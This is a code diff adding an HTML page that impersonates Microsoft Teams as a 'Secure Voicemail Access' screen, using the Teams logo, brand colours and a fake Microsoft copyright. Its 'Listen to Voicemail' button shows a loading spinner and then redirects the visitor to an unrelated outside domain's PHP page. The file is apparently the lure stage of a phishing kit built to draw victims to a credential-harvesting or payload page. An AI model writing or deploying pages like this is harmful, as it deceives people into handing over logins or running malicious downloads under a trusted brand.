@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Teams - Secure Voicemail Access</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #f3f2f9, #e0e0f5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #333;
+    }
+    .container {
+      max-width: 500px;
+      width: 90%;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      padding: 20px;
+      border-top: 8px solid #6264a7;
+      position: relative;
+      margin: 20px; /* Space around the container */
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .header img {
+      height: 40px;
+      margin-right: 10px;
+    }
+    .header h1 {
+      font-size: 1.8em;
+      color: #6264a7;
+      margin: 0;
+    }
+    .icon-secure {
+      font-size: 50px;
+      color: #6264a7;
+      margin-top: 10px;
+    }
+    .message {
+      font-size: 18px;
+      margin: 15px 0;
+      color: #444;
+    }
+    .button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #6264a7;
+      color: #ffffff;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 6px;
+      text-decoration: none;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+      cursor: pointer;
+      border: none;
+    }
+    .button:hover {
+      background-color: #555ba7;
+    }
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #ffffff;
+      border-top: 3px solid #555ba7;
+      border-radius: 50%;
+      margin-right: 8px;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 30px;
+      text-align: center;
+    }
+    .footer p {
+      margin: 0;
+      padding: 8px 0;
+    }
+    .footer a {
+      color: #6264a7;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .install-link {
+      font-size: 14px;
+      display: block;
+      margin-top: 15px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        width: 95%; /* Limits width on mobile */
+        padding: 15px; /* Adds padding within the container */
+        margin: 10px; /* Adds margin around the container */
+      }
+      .header h1 {
+        font-size: 1.5em;
+      }
+      .message {
+        font-size: 16px;
+        margin: 10px 0;
+      }
+      .button {
+        font-size: 14px;
+        padding: 10px 20px;
+      }
+      .header img {
+        height: 30px;
+        margin-right: 8px;
+      }
+      .icon-secure {
+        font-size: 40px;
+        margin-top: 5px;
+      }
+      .install-link {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://ribboncommunications.com/sites/default/files/microsoft-teams-logo-medium.png" alt="Teams Logo">
+      <h1>Voicemail Access</h1>
+    </div>
+
+    <div class="icon-secure">🔒</div>
+    <p class="message">Your voicemail message is securely waiting for you.</p>
+
+    <button class="button" onclick="playVoicemail()">
+      <div class="spinner" id="spinner"></div>
+      <span id="buttonText">Listen to Voicemail</span>
+    </button>
+
+    <div class="footer">
+      <a href="https://www.microsoft.com/en/microsoft-teams/download-app" target="_blank" class="install-link">Download Microsoft Teams to stay connected</a>
+      <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">Support</a></p>
+      <p>&copy; 2024 Microsoft Teams</p>
+    </div>
+  </div>
+
+  <script>
+    function playVoicemail() {
+      // Show spinner and change button text
+      document.getElementById('spinner').style.display = 'inline-block';
+      document.getElementById('buttonText').textContent = 'Loading...';
+
+      // Simulate loading delay before redirecting
+      setTimeout(function() {
+        // Redirect to the final voicemail page
+        window.location.href = 'https://humlouyflenu.us/tman.php'; // Replace with actual URL
+      }, 2000); // Adjust delay as needed (2000ms = 2 seconds)
+    }
+  </script>
+</body>
+</html>
